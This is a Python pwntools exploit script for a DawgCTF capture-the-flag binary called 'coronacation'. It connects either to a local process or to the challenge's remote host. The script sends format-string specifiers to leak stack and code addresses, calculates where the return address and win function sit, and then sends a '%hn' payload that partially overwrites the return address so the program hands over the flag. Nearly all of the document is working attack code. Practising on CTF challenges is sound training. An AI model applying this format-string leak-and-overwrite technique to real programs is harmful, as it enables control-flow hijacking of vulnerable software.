from pwn import *
import re


def get_flag():

	localc=True

	context.arch = "amd64"

	if localc:
		p = process("./coronacation")
		gdb.attach(p)
	else:
		p = remote("ctf.umbccd.io", 4300)


	p.recvuntil("out.\n")
	p.sendline("1"+"%p."*14)

	# offset_win = leak[-3] - win_addr <=> win_addr = leak[-3] - offset_win
	offset_win = 0x55f6d7821080 - 0x55f6d7821165
	#offset_ret = leak[-2] - ret_addr <=> ret_addr = leak[-2] - offset_ret
	offset_ret = 0x7ffe2f894cc0 -0x7ffe2f894c68
	leak = p.recvuntil("\n")

	print(p.recvuntil("plan.\n"))
	print("leak is:"+leak)
	leak = leak.split(".")
	#win_addr =  p64(int(leak_addr, 16)-offset_win)
	print("address of win should be: "+str(hex(int(leak[-3], 16)-offset_win)))
	last_two_bytes = int("0x"+str(hex(int(leak[-3], 16)-offset_win))[-4:], 16)

	ret_addr = int(leak[-2],16) - offset_ret
	print("The ret address to overwrite should be: "+hex(ret_addr)+" in p64: "+p64(ret_addr))
	ret_addr = p64(ret_addr)


	#change the two last bytes of the return to point to the win function 
	len_last_two = len(str(last_two_bytes))
	payload = "a"*(8-len_last_two)+"%"+str(last_two_bytes-(8-len_last_two))+"x%8$hn."+ret_addr
	
	p.sendline(payload)
	a = p.recvuntil("}")
	flag = re.findall(r"DawgCTF{.*}",a)
	if flag > 0:
		print("Flag is: "+flag[0])
	p.close()
	
if __name__ == '__main__':
	#part_exploit()
	get_flag()